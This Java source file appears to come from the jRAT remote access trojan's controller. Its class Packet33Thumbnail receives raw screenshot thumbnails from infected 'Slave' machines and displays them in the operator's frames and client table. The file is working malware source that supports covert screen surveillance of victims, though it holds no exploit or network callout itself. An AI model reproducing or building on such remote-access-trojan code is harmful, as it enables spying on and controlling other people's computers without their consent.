package pro.jrat.packets.incoming;

import java.awt.image.BufferedImage;
import java.awt.image.DataBufferByte;
import java.io.DataInputStream;

import javax.swing.ImageIcon;

import pro.jrat.Slave;
import pro.jrat.ui.frames.Frame;
import pro.jrat.ui.frames.FrameInfo;
import pro.jrat.utils.Util;



public class Packet33Thumbnail extends AbstractIncomingPacket {

	private BufferedImage bufferedImage;

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		bufferedImage = new BufferedImage(150, 100, BufferedImage.TYPE_3BYTE_BGR);
		byte[] buffer = ((DataBufferByte) bufferedImage.getRaster().getDataBuffer()).getData();

		slave.getDataInputStream().readFully(buffer);

		slave.setThumbnail(new ImageIcon(bufferedImage));
		FrameInfo frame1 = FrameInfo.instances.get(slave);
		if (frame1 != null) {
			frame1.panel.image = slave.getThumbnail().getImage();
			frame1.panel.repaint();
		}
		
		int row = Util.getRow(slave);
		
		if (row != -1 && Frame.thumbnails) {
			Frame.mainModel.setValueAt(slave.getThumbnail(), row, 0);
		}
	}

}
